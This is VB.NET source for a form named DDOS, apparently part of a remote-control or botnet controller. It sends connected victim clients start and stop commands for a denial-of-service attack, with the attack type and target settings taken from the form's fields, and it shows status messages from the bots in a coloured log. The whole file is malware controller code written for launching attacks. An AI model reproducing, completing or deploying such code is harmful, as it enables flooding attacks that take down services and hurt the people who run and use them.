Public Class DDOS
    Public F As Form1
    Public u As USER

    Private Sub ChButton2_Click(sender As Object, e As EventArgs) Handles ChButton2.Click

        F.S.Send(u, ChCombobox1.Text + F.SPL + ChTextbox1.Text + F.SPL + ChTextbox5.Text + F.SPL + ChTextbox3.Text)

        ChButton2.Visible = False
        ChButton3.Visible = True

        ChCombobox1.Enabled = False
        ChTextbox1.Enabled = False
        ChTextbox5.Enabled = False
        ChTextbox3.Enabled = False

    End Sub

    Private Sub L3_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L3.DrawItem
        Try
            e.DrawBackground()

            If L3.Items(e.Index).ToString.Contains("started!") Then
                e.Graphics.DrawString(L3.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L3.Items(e.Index).ToString.Contains("aborted successfully") Then
                e.Graphics.DrawString(L3.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L3.Items(e.Index).ToString.Contains("Error") Then
                e.Graphics.DrawString(L3.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L3.Items(e.Index).ToString.Contains("finished successfully") Then
                e.Graphics.DrawString(L3.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            Else
                e.Graphics.DrawString(L3.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L3_Click(sender As Object, e As EventArgs) Handles L3.Click
        L3.ClearSelected()
    End Sub

    Public Sub Messages_DDOS(ByVal user As String, ByVal msg As String)
        L3.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ChButton3_Click(sender As Object, e As EventArgs) Handles ChButton3.Click
        F.S.Send(u, ChCombobox1.Text + F.SPL + "_Close_")
        ChButton2.Visible = True
        ChButton3.Visible = False

        ChCombobox1.Enabled = True
        ChTextbox1.Enabled = True
        ChTextbox5.Enabled = True
        ChTextbox3.Enabled = True
    End Sub

    Private Sub DDOS_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        F.S.Send(u, "Close")
    End Sub
End Class